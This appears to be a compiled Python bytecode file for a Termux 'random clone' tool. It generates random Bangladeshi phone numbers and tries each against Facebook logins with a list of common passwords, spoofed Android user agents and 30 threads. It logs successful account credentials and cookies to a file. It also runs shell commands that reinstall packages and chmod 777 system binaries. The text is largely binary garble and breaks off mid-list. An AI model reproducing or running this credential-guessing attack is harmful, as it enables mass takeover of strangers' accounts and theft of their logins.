�
    ��d�w  �                   �  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlmZ d dlmZ d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ 	 d dlZd dlmZ d dlZd dlmZ n# e$ r  ej        d	�  �         Y nw xY wd dlZd dlZd dlZ ej        d
�  �          ed�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �          ej        d�  �         d dlmZ d dlZd dl	Z	d dlZd dl Z d dl!Z!d dlmZ d dlmZ 	 d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl
Z
d dlZd dl"Z"d dlT d dlmZ# n# e$ r  ej        d�  �         Y n Y nxY wdZ$dZ% ej&        �   �         Z&e&�'                    d�  �        Z( ej&        �   �         Z)e)j*        Z+e)j,        Z-e)j.        Z/ ej0        �   �         Z0d a1g a2g a3g Z4 ej5        �   �         Z6g Z7g Z8d� Z9 ej:        g d��  �        Z; ej:        g d��  �        Z< ej:        g d��  �        Z= ej:        ddg�  �        Z> ej?        dd�  �        � d ej?        dd �  �        � d! ej?        dd�  �        � �Z@ eA ej?        d"d#�  �        �  �        ZB ej:        g d$��  �        ZC ej:        g d%��  �        ZD ej:        g d&��  �        ZE ej:        g d'��  �        ZF ej:        g d(��  �        ZG ej:        g d)��  �        ZH ej:        g d*��  �        ZId+� ZJd,ZKd-� ZLd.� ZMd/� ZNd0� ZO eM�   �          dS )1�    N)�BeautifulSoup)�date)�datetime)�sleep)�system)�ThreadPoolExecutor)�ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/null�clearu0   [38;5;79m〘✧〙FUCK METHOD CAPTURE USER.....z6pip uninstall urllib3 requests chardet idna certifi -yz1pip install urllib3 requests chardet idna certifiz/chmod 777 /data/data/com.termux/files/usr/bin/*z/pip install requests bs4 futures==2 > /dev/null)�path)�*z+pip install requests futures==2 > /dev/nullz[1;91mz[1;32mz%H:%Mc                  �  � t          t          dd�  �        �  �        } g d�}g d�}g d�}g d�}g d�}g d�}||||||d	�}t          j        | �  �        }t          j        t          |�                    �   �         �  �        �  �        }	t          j        ||	         �  �        }
t          j        d
d�  �        � dt          j        d
d�  �        � t          j        d
d�  �        � �}t          j        dd�  �        � dt          j        dd�  �        � �}t          j        dd�  �        � dt          j        dd�  �        � dt          j        dd�  �        � dt          j        dd�  �        � �}t          t          j        dd�  �        �  �        }t          j        d�  �        }d|� d|	� d|
� d|� d|� d|� d|
� d|	� d|� d|� d�}|S ) N�   �   )z	Galaxy S6z	Galaxy S7z	Galaxy S8z	Galaxy S9z
Galaxy S10zGalaxy Note 5zGalaxy Note 8zGalaxy Note 9z	Galaxy A5z	Galaxy A7z	Galaxy J5z	Galaxy J7)�P10�P20�P30zMate 10zMate 20�Y7�Y9zNova 3i)
zRedmi Note 5zRedmi Note 6zRedmi Note 7zRedmi Note 8zRedmi Note 9zMi A1zMi A2zMi 8zMi 9zPoco F1)
�F7�F9�A3s�A5s�A7�A9�R11�R17zReno 2zReno 3)
�Y55�Y71�Y81�Y91�Y93�Y95�V9�V11�V15�S1)�C1�C2z3 Proz5 Pro�X�X2)�samsung�huawei�xiaomi�oppo�vivo�realme�	   �c   �.0.0.�� �?B �.�o   ��  i ����ɚ;)�com.facebook.adsmanager�com.facebook.lite�com.facebook.orca�com.facebook.katana� Dalvik/2.1.0 (Linux; U; Android �; � z Build/SKQ1.z) [FBAN/EMA;FBLC/en_US;FBAV/z;FBBV/z;FBDV/z;FBMD/z;FBSN/z;FBPN/�])�list�range�random�choice�keys�randint�str)�android_versions�samsung_models�huawei_models�xiaomi_models�oppo_models�vivo_models�realme_models�android_models�and_vers�brand�and_mod�and_id�app_uld�app_ver�app_vercode�pkg_name�uas                    �temp.py�uaar[   ;   s|  � ��E�!�R�L�L�)�)�� �  �  �N�V�V�V�M� R�  R�  R�M�Z�Z�Z�K�V�V�V�K�=�=�=�M�!������� �N� �}�-�.�.�H��M�$�~�2�2�4�4�5�5�6�6�E��m�N�5�1�2�2�G���q��$�$�W�W�6�>�!�B�+?�+?�W���PQ�RT�AU�AU�W�W�F�����/�/�K�K�&�.��S�2I�2I�K�K�G����3�'�'�t�t�&�.��C�*@�*@�t�t�6�>�RT�UX�CY�CY�t�t�\b�\j�km�nq�\r�\r�t�t�G��f�n�Y�y�9�9�:�:�K��}�v�w�w�H� 
R�H�  
R�  
R��  
R�  
R��  
R�  
R�U\�  
R�  
R�  {B�  
R�  
R�  JU�  
R�  
R�  ]d�  
R�  
R�  lq�  
R�  
R�  y�  
R�  
R�  GO�  
R�  
R�  
R�B��I�    (}  zGT-1015zGT-1020zGT-1030zGT-1035zGT-1040zGT-1045zGT-1050zGT-1240zGT-1440zGT-1450zGT-18190zGT-18262z	GT-19060IzGT-19082zGT-19083zGT-19105zGT-19152zGT-19192zGT-19300zGT-19505zGT-2000zGT-20000zGT-200szGT-3000z	GT-414XOPzGT-6918zGT-7010zGT-7020zGT-7030zGT-7040zGT-7050zGT-7100zGT-7105zGT-7110zGT-7205zGT-7210zGT-7240RzGT-7245zGT-7303zGT-7310zGT-7320zGT-7325zGT-7326zGT-7340zGT-7405zGT-7550   5GT-8005zGT-8010zGT-81zGT-810zGT-8105zGT-8110zGT-8220SzGT-8410zGT-9300zGT-9320zGT-93GzGT-A7100zGT-A9500z
GT-ANDROIDzGT-B2710zGT-B5330z	GT-B5330Bz	GT-B5330LzGT-B5330ZKAINUzGT-B5510zGT-B5512zGT-B5722zGT-B7510zGT-B7722zGT-B7810zGT-B9150zGT-B9388zGT-C3010zGT-C3262z	GT-C3310RzGT-C3312z	GT-C3312Rz	GT-C3313TzGT-C3322z	GT-C3322izGT-C3520z	GT-C3520IzGT-C3592zGT-C3595zGT-C3782zGT-C6712z	GT-E1282TzGT-E1500zGT-E2200zGT-E2202zGT-E2250zGT-E2252zGT-E2600z	GT-E2652WzGT-E3210zGT-E3309z	GT-E3309Iz	GT-E3309TzGT-G530HzGT-g900fzGT-G930FzGT-H9500zGT-I5508zGT-I5801zGT-I6410zGT-I8150zGT-I8160OKLTPAzGT-I8160ZWLTTTzGT-I8258z	GT-I8262DzGT-I8268zGT-I8505zGT-I8530BAABTUzGT-I8530BALCHOzGT-I8530BALTTTz	GT-I8550EzGT-i8700zGT-I8750zGT-I900z	GT-I9008LzGT-i9040z	GT-I9080Ez	GT-I9082CzGT-I9082EWAINUz	GT-I9082iz	GT-I9100GzGT-I9100LKLCHTz	GT-I9100Mz	GT-I9100Pz	GT-I9100TzGT-I9105UANDBTz	GT-I9128Ez	GT-I9128Iz	GT-I9128Vz	GT-I9158Pz	GT-I9158Vz	GT-I9168Iz	GT-I9192Iz	GT-I9195Hz	GT-I9195LzGT-I9250z	GT-I9303Iz	GT-I9305Nz	GT-I9308Iz	GT-I9505Gz	GT-I9505Xz	GT-I9507VzGT-I9600zGT-m190zGT-M5650zGT-miniz	GT-N5000S�GT-N5100zGT-N5105zGT-N5110zGT-N5120z	GT-N7000BzGT-N7005z	GT-N7100TzGT-N7102zGT-N7105z	GT-N7105TzGT-N7108z	GT-N7108D�GT-N8000zGT-N8005zGT-N8010zGT-N8020zGT-N9000zGT-N9505zGT-P1000CWAXSAz	GT-P1000Mz	GT-P1000TzGT-P1010z	GT-P3100BzGT-P3105zGT-P3108�GT-P3110�GT-P5100�GT-P5200zGT-P5210XD1�GT-P5220zGT-P6200z	GT-P6200LzGT-P6201zGT-P6210zGT-P6211zGT-P6800zGT-P7100zGT-P7300z	GT-P7300BzGT-P7310zGT-P7320z	GT-P7500Dz	GT-P7500Mz	GT-P7500Rz	GT-P7500VzGT-P7501zGT-P7511zGT-S3330zGT-S3332zGT-S3333zGT-S3370zGT-S3518zGT-S3570z	GT-S3600izGT-S3650z	GT-S3653Wz	GT-S3770Kz	GT-S3770Mz	GT-S3800WzGT-S3802zGT-S3850zGT-S5220z	GT-S5220RzGT-S5222zGT-S5230z	GT-S5230Wz	GT-S5233Tz	GT-s5233wzGT-S5250zGT-S5253zGT-s5260zGT-S5280zGT-S5282z	GT-S5283BzGT-S5292zGT-S5300z	GT-S5300LzGT-S5301z	GT-S5301Bz	GT-S5301LzGT-S5302z	GT-S5302BzGT-S5303z	GT-S5303BzGT-S5310z	GT-S5310Bz	GT-S5310Cz	GT-S5310Ez	GT-S5310Gz	GT-S5310Iz	GT-S5310Lz	GT-S5310Mz	GT-S5310NzGT-S5312z	GT-S5312Bz	GT-S5312Cz	GT-S5312LzGT-S5330zGT-S5360z	GT-S5360Bz	GT-S5360Lz	GT-S5360TzGT-S5363zGT-S5367zGT-S5369zGT-S5380z	GT-S5380DzGT-S5500zGT-S5560z	GT-S5560iz	GT-S5570Bz	GT-S5570Iz	GT-S5570LzGT-S5578zGT-S5600zGT-S5603zGT-S5610z	GT-S5610KzGT-S5611zGT-S5620zGT-S5670z	GT-S5670BzGT-S5670HKBZTAzGT-S5690z	GT-S5690RzGT-S5830z	GT-S5830Dz	GT-S5830Gz	GT-S5830iz	GT-S5830Lz	GT-S5830Mz	GT-S5830Tz	GT-S5830Vz	GT-S5831izGT-S5838z	GT-S5839izGT-S6010zGT-S6010BBABTUzGT-S6012z	GT-S6012BzGT-S6102z	GT-S6102Bz	GT-S6293Tz	GT-S6310BzGT-S6310ZWAMIDzGT-S6312z	GT-S6313TzGT-S6352zGT-S6500z	GT-S6500Dz	GT-S6500LzGT-S6790z	GT-S6790Lz	GT-S6790Nz	GT-S6792LzGT-S6800zGT-S6800HKAXFAzGT-S6802zGT-S6810z	GT-S6810Bz	GT-S6810Ez	GT-S6810Lz	GT-S6810MzGT-S6810MBASERz	GT-S6810PzGT-S6812z	GT-S6812Bz	GT-S6812Cz	GT-S6812izGT-S6818z	GT-S6818Vz	GT-S7230Ez	GT-S7233Ez	GT-S7250DzGT-S7262zGT-S7270z	GT-S7270LzGT-S7272z	GT-S7272Cz	GT-S7273TzGT-S7278z	GT-S7278U�GT-S7390z	GT-S7390Gz	GT-S7390LzGT-S7392z	GT-S7392LzGT-S7500zGT-S7500ABABTUzGT-S7500ABADBTzGT-S7500ABTTLPzGT-S7500CWADBTz	GT-S7500Lz	GT-S7500TzGT-S7560z	GT-S7560MzGT-S7562z	GT-S7562Cz	GT-S7562iz	GT-S7562LzGT-S7566zGT-S7568z	GT-S7568IzGT-S7572z	GT-S7580Ez	GT-S7583TzGT-S758XzGT-S7592zGT-S7710z	GT-S7710LzGT-S7898z	GT-S7898IzGT-S8500zGT-S8530zGT-S8600z	GT-STB919zGT-T140zGT-T150zGT-V8azGT-V8izGT-VC818z	GT-VM919SzGT-W131zGT-W153zGT-X831zGT-X853zGT-X870zGT-X890zGT-Y8750���GT-I9190�KOT49H�GT-I9192rf   �	GT-I9300I�KTU84P�GT-I9300�IMM76Drj   �JSS15J�	GT-I9301I�KOT4rm   rf   �GT-I9500�JDQ39ro   �LRX22Cr]   �JZO54K�GT-N7100rf   r^   rr   r^   rf   r_   rr   r`   �IML74Kr`   �JDQr`   rp   r`   rr   �GT-P5110rp   ra   rf   �GT-P5210rf   rb   rp   rc   rr   �SAMSUNG�SM-A500Frx   �SM-G532Frx   �SM-G920Frx   �SM-G935Frx   �SM-J320Frx   �	SM-J510FNrx   zSM-N920Srx   zSM-T280�	SM-A500FU�MMB29Mry   �LRX22Gry   r�   �SM-A500Hr�   �SM-G900Frf   r{   �MMB29Kr{   �NRD90M�SM-G930Fr�   r|   r�   r|   r�   �SM-G950Fr�   �	SM-J320FN�LMY47Vr}   �LMY4r}   r�   �SM-J320Hr�   �SM-J320Mr�   r~   r�   r~   �NMF2r~   �NMF26Xr~   �NMF26X;�SM-J701F�NRD90M;�SM-T111rp   �SM-T230rf   �SM-T231rf   �SM-T235zKOT4SM-T310rf   �SM-T311rn   r�   rf   �SM-T315rp   �SM-T525rf   �SM-T531rf   r�   r�   �SM-T535r�   �SM-T555r�   �SM-T561ri   �SM-T705r�   r�   r�   �SM-T805r�   zSM*T820r�   �SPH-L720rf   )�grameenphone�Robi�Axiata�airtelzT-Mobile�YOTAr=   r<   r7   r8   r3   �   r2   r6   i�k�r9   )�GM1917�GM1913�GM1911�GM1910�GM1915)�CPH1851�CPH1609�CPH2385�CPH2365�CPH2061�CPH2373�CPH2125�CPH1879(*  r{   r�   r�   r�   r�   rf   r}   r�   re   rf   rs   rf   r�   ri   rs   rf   ro   rq   r}   r�   r�   r�   r}   r�   r~   r�   r`   rt   r}   r�   r^   rr   r�   r�   r�   rf   ro   rp   r|   r�   r�   ri   r�   rf   r�   r�   ry   r�   r   r�   ry   r�   r�   rf   r�   r�   r}   r�   r�   r�   r}   r�   rw   rf   r�   rf   rg   rf   r�   rn   rs   rf   ry   r�   ry   r�   rs   rf   r{   r�   r~   r�   r^   rr   r�   r�   r�   r�   r�   r�   rj   rl   ro   rq   r}   r�   r~   r�   ry   r�   r^   rf   r�   ri   r�   rf   rc   rr   r}   r�   r`   rr   r   r�   r�   r�   r~   r�   r�   ri   r^   rf   r�   r�   r~   r�   r~   r�   r}   r�   rv   rp   rm   rf   ry   r�   r�   r�   r�   rn   ra   rf   rm   rf   r�   r�   r�   r�   �SM-T820r�   rg   rf   r|   r�   r�   r�   rm   rn   r�   r�   r�   rp   ry   r�   r~   r�   r�   r�   r{   r�   r]   rr   rh   ri   rh   ri   r^   rf   r^   rf   ry   r�   re   rf   r~   r�   r}   r�   r`   rp   rh   ri   r]   rr   r^   rf   ro   rq   r�   r�   ry   r�   r^   rr   r�   r�   r�   rf   r]   rr   r�   r�   r�   rf   r�   r�   r|   r�   zSM-T310rf   r^   rf   rh   ri   r{   r�   r~   r�   r�   zLRX22G;r_   rr   rg   rf   r}   r�   r{   r�   rj   rk   r�   r�   r}   r�   r~   r�   r�   r�   ry   r�   r�   rf   r�   rf   r�   r�   rw   rf   r�   r�   ro   rq   ra   rf   rm   rf   rj   rl   rs   rf   r�   r�   r�   r�   r�   rp   r}   r�   re   rf   rb   rp   r�   rf   r�   r�   re   rf   r~   r�   ry   r�   rg   rf   r`   ru   r�   rf   )zSM-J111FzWAS-LX1�WAS-LX3�G3112zSM-G885FzSM-A520F�SM-A260G�SM-A810FzSM-G388FzWAS-LXzSM-J720FzSM-G532GzSM-A6058�SM-G8858zPRA-LX3zPRA-LX2�X00IDr�   zWAS-L03TzSM-j105H)�1718�1606�1807�1730�1725�1808�1714�2001A�1719�2002�1923A�1930)zMT7-TL00zSM-J110Lr�   zSM-G8850z	SM-A810YZzSM-J110GzWAS-AL00zHMA-L09rz   r�   zDUB-LX3r�   r�   zSM-J106MzSM-J105YzSM-J106Br�   zSM-J720M�R3zPOT-LX1)�001�002�003�004�005�006�007�008�009�010�011�012�013�014�015�016�017�018�019�020c                  ��  � dt          t          j        dd�  �        �  �        z   dz   t          t          �  �        z   dz   } dt          t          j        dd�  �        �  �        z   d	z   t          t
          �  �        z   d
z   t          t          j        dd�  �        �  �        z   dz   t          t          j        dd�  �        �  �        z   dz   t          | �  �        z   dz   }|S )Nz[FBAN/FB4A;FBAV/r7   r8   z�.0.0.44.127;FBBV/225129304;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/227665120;FBCR/Airtel-Stay Home | airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/z-;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;r>   �   �   r?   z Build/QP1A.r4   r5   r6   z) � )rH   rD   rG   �d18�	randrange�model)�ENDrY   s     rZ   �tanimr�   c   s`  � � ��V�^�C��%<�%<�!=�!=�=�  ?w�  w�  x{�  |�  x@�  x@�  @�  Ap�  p��/��F�4D�Q�r�4J�4J�0K�0K�K�D�P�QT�UZ�Q[�Q[�[�\j�j�kn�ou�o�  AG�  HN�  pO�  pO�  lP�  lP�  P�  QT�  T�  UX�  Y_�  Yi�  jm�  nq�  Yr�  Yr�  Us�  Us�  s�  tx�  x�  y|�  }@�  yA�  yA�  A�  BD�  D���	r\   u�          
        [38;5;83m __..__..  .._..__
        [38;5;84m(__ [__]|\/| | [__)
        [38;5;85m.__)|  ||  |_|_|  \  [38;5;197m(V5)
[38;5;77m──────────────────────────────────────────────                 
[38;5;78m〘✧〙DEVLOPER  [38;5;222m➤  [38;5;78m SADMAN SAMIR SNIGDHO
[38;5;79m〘✧〙FACEBOOK  [38;5;222m➤  [38;5;79m SNIGDHO AFRIDI
[38;5;115m〘✧〙WHATSAPP  [38;5;222m➤   [38;5;115m+8801871778635
[38;5;78m〘✧〙TOOLS     [38;5;222m➤   [38;5;78mRANDOM CLONE    [38;5;197m(FREE)
[38;5;77m──────────────────────────────────────────────c                  �$   � t          d�  �         d S )Nu�   [38;5;194m──────────────────────────────────────────────)�print� r\   rZ   �linexr�   q   s)   � ��  c�  d�  d�  d�  d�  dr\   c                  �T  � t          j        d�  �         t          t          �  �         t          d�  �         t          d�  �         t	          �   �          t          d�  �        } | dv rt          �   �          | dv rt          j        d�  �         | dv rt          j        d�  �         d S d S )	Nr
   u#   [38;5;155m➤  [1] RANDOM CRACK BDu   [38;5;155m➤  [2] EXIT TOOLS �   [38;5;155m[➤] YOUR CHOICE : )�1�01)�2�02�exit)�E�e)�osr   r�   �logor�   �input�bhoot)�ts    rZ   �mainr�   s   s�   � ��I�g����u�T�{�{�{�	�
3�4�4�4�	�
/�0�0�0������0�1�1�A��J��������J���
�	�&�����I�~�~�
�	�&������ �~r\   c                  �j  � g } g }t           j         t           j         t          j        d�  �         t	          t
          �  �         t	          d�  �         t          d�  �        }t          �   �          t          j        d�  �         t	          t
          �  �         t	          d�  �         t          t          d�  �        �  �        }t          �   �          t          j        d�  �         t	          t
          �  �         t          |�  �        D ]C}d�
                    d� t          d�  �        D �   �         �  �        }| �                    |�  �         �Dt          d�	�  �        5 }t          t          | �  �        �  �        }t	          d
�  �         t          �   �          | D ]P}|dd �         |||z   ||d d�         z   ddddddddddddddddg}	||z   }
|�                    t           |
|	|�  �         �Q	 d d d �  �         n# 1 swxY w Y   t	          dt          t          t"          �  �        �  �        z   �  �         d S )Nr
   u,   [38;5;155m[✧] SIM CODE : 017,016,018,019 r�   u2   [38;5;155m[✧] LIMIT EXAMPLE : 5000,10000,50000 r�   c              3   �R   K  � | ]"}t          j        t          j        �  �        V � �#d S )N)rD   rE   �string�digits)�.0�_s     rZ   �	<genexpr>zbhoot.<locals>.<genexpr>�   s.   � � � �E�E�q�f�m�F�M�2�2�E�E�E�E�E�Er\   �   �   )�max_workersuP   [38;5;155m[➤] [38;5;222mUSE FLIGHT MOD AFTER 2 MINUTES GET MORE OK IDS <>~~~�   �   �
bangladeshz	free firez
i love you�sadiya�mimmim�mababa�sarmin�riya123�yousha�sabbir�mehedi�tonmoy�ayesha�fuckyou�tammana�nishatzTOTAL OK [1;92m)r�   �getuid�geteuidr   r�   r�   r�   r�   �intrC   �join�append�
ThreadPoolrH   �len�submit�api�oks)�user�twf�code�limit�nmbr�nmp�TANIM�tl�love�pwx�idss              rZ   r�   r�   �   s{  � �	�D�	�C��I�I��J�J��I�g����	�$�K�K�K�	�
<�=�=�=��6�7�7�D������I�g����	�$�K�K�K�	�
B�C�C�C���:�;�;�<�<�E�U�W�W�W��I�g����	�$�K�K�K��e��� � ���g�g�E�E�E�!�H�H�E�E�E�E�E�����C�����	��	#�	#�	#� )�u���T���^�^���f�g�g�g�hm�ho�ho�ho�� 	)� 	)�D�����8�D��d��4��R�a�R��=��k�R^�_g�hp�qy�  {C�  DM�  NV�  W_�  `h�  iq�  rz�  {D�  EN�  OW�  X�C��t�)�C��L�L��S��R�(�(�(�(�	)�)� )� )� )� )� )� )� )� )� )� )���� )� )� )� )� 
�
��C��H�H���
-�.�.�.�.�.s   �BG7�7G;�>G;c                 ��  � t           j        �                    dt          � dt          � t          t          �  �        � d��  �         t           j        �                    �   �          	 |D �]g}t          t          j
        dd�  �        �  �        dz   t          t          j        dd�  �        �  �        z   t          t          j
        dd�  �        �  �        z   }t          t          j
        d	d
�  �        �  �        }t          j        g d��  �        }t          j        g d��  �        }t          j        g d��  �        }t          t          j        dd�  �        �  �        }	d}
t          t          j        �   �         �  �        }t          �   �         }
i dt          t          j        �   �         �  �        �dd�dt          t          j        �   �         �  �        �d| �d|�dd�dd�dd�dd�dt          t          j        �   �         �  �        �dd�dd �d!d"�d#d$�d%d�d&d�d'd(�d)d*d+d,��}t!          �   �         d-d.d/d0d+t          t          j
        d1d2�  �        �  �        t          t          j
        d1d2�  �        �  �        t          t          j
        d1d2�  �        �  �        d3d4d5d6�}t#          j        d7||d8�9�  �        �                    �   �         }d:|v �r|d;         }i }|D ]%}|�                    |d<         |d=         i�  �         �&d>�                    d?� |�                    �   �         D �   �         �  �        }t/          j        d@|�  �        d	         } t3          dA| z   dBz   |z   dCz   �  �         t3          dD|z   dEz   �  �         t5          �   �          t          �                    | �  �         t9          dFdG�  �        �                    | dHz   |z   dIz   �  �          n��it          dJz  ad S # t:          $ r}Y d }~d S d }~ww xY w)KNu-   [38;5;155m[➤] SAMIR~FINDING  [38;5;155m[z]  [38;5;155mOK :- r@   r7   i+  r3   r1   �1   r   r9   )r:   r;   r<   r=   zcom.facebook.mliterd   �   r   a�  Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC72 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; TB718 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 13; OPD2203 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-V607L Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; RC609L Build/ORB609L_V1.3.0_BTM-ST)","Dalvik/2.1.0 (Linux; U; Android 12; A201SH Build/S0020)","Dalvik/2.1.0 (Linux; U; Android 11; Infinix X663D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) play Build/QPYS30.95-Q3-10-62-3-22)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS_TVE19A Build/PTMW.190511.139)","Dalvik/2.1.0 (Linux; U; Android 10.0; Note10+ Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 13; SM-M546B Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTEAMR311 Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 12; H4113 Build/SQ3A.220705.004)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOWS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AEOCW Build/NS6505)","Dalvik/2.1.0 (Linux; U; Android 12; X55 Build/SP1A.210812.016)","Dalvik/1.4.0 (Linux; U; Android 2.3.5; HTC Desire HD A9191 Build/GRJ90)","Dalvik/2.1.0 (Linux; U; Android 11; M2004J19C Build/RP1A.200720.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; SM-A037G Build/RP1A.200720.012) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 9; CPH2015 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; STK-L21 Build/HUAWEISTK-L21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i14_Max Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; V2131 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; ONEPLUS A6013 Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 7.0; F803YM Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; moto e20 Build/RONS31.267-94-3)","Dalvik/2.1.0 (Linux; U; Android 6.0; Note20+ Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6a Build/TQ2A.230505.002.G1)","Dalvik/2.1.0 (Linux; U; Android 9; Lenovo TB-8504F Build/PQ3A.190801.002)","Dalvik/2.1.0 (Linux; U; Android 11; ASUS_I005D Build/RKQ1.210303.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2038 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; LG-H870 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; Optima 7 A102 3G TS7243PG Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BL150 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; A8P Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:c74a09cf-2e2f-4494-a948-5f5a01fcd349; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:be27f2fd-13ef-4eb9-8fcd-a2b48e2a17e9; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 13; V2072A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SC-52A Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7327.3326N) C4oD_Android/9.6.0 (uid:aa16de38-3bc3-4ff0-b52b-803a42312cfb; tid:-; did:Amazon_KFONWI_28;)","Dalvik/2.1.0 (Linux; U; Android 12; AGS5-W09 Build/HUAWEIAGS5-W09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-17)","Dalvik/2.1.0 (Linux; U; Android 11; PEGM10 Build/RKQ1.201217.002)","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TG Build/SKQ1.211103.001) VD/235","Dalvik/2.1.0 (Linux; U; Android 7.0; Archos 101b Xenon Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; SL104D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11.0; i13 pro Max Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; moto g52 Build/S1SRS32.38-132-11)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo TB-Q706F Build/RKQ1.210614.002)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) Build/S1RFS32.27-25-12)","Dalvik/2.1.0 (Linux; U; Android 9; POS-EIBTPDC Build/PI)","Dalvik/2.1.0 (Linux; U; Android 12; SM-E045F Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Z42 pro Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; MX-A10R Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; mt5867 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; PCHM10 Build/RKQ1.200903.002)","Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTK2.220814.001)","Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM4.220307.159)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.A1)","Dalvik/2.1.0 (Linux; U; Android 12; A161 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; MAXIMUS 5.0 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; Android 7.1.2; MI 8 SE Build/311vx; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; SHV46 Build/PKQ1.190626.001)","Dalvik/2.1.0 (Linux; U; Android 13; NX712J Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 11; T766H_EEA Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; 5002E Build/QKQ1.200623.002) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A3 2020 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; T5 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; M2003J15SC MIUI/V12.0.10.0.QJOEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-2-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Viva_1003G_Lite Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 fusion Build/S3SJS32.1-86-2-4)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N971N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 11; Facilotab L Rubis Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.025)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_x86_64 Build/TSE5.230214.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40Pro_RUS Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; NLG-QBEX Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris X5 Plus Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-11)","Dalvik/2.1.0 (Linux; U; Android 12; V Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S88Pro Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 